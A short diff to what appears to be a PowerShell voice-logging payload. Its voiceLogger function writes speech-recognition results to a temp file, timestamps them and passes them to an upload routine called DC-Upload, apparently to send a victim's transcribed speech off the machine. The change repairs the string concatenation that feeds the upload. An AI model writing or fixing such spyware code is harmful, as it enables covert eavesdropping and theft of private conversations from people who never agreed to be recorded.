@@ -39,7 +39,9 @@ function voiceLogger {
             $log = "$env:tmp/VoiceLog.txt"
             echo $results > $log
             $text = get-content $log -raw
-	    $conc = '(-) ' + $Get-TimeStamp + ': $text'
+     	    $tstamp = Get-TimeStamp
+	    $str1 = ‘(-) ’
+	    $conc = [System.String]::Concat($str1,".",$tstamp,".",$text)
             DC-Upload $conc 
 
             # Use a switch statement with the $results variable
